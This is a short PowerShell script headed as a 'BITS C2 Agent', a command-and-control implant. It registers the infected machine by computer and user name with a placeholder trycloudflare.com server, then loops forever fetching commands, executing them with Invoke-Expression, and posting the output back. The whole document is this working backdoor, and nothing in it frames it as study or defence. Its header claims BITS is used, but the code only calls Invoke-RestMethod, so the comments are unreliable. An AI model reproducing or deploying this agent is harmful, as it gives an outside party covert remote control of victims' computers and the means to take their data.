# BITS C2 Agent
# Uses Windows Background Intelligent Transfer Service
# No direct sockets - all via BITS (trusted by Windows)

 $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME

# Register with C2
try {
    Invoke-RestMethod -Uri "$ServerUrl/register?id=$AgentId" -Method GET | Out-Null
} catch {}

while ($true) {
    try {
        # Get command using BITS
        $cmd = (Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId" -Method GET).command
        
        if ($cmd -and $cmd -ne "") {
            # Execute command
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            
            # Send result back using BITS
            $body = @{ result = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId" -Method POST -Body $body -ContentType "application/json" | Out-Null
        }
        
        Start-Sleep -Seconds 3
        
    } catch {
        Start-Sleep -Seconds 5
    }
}
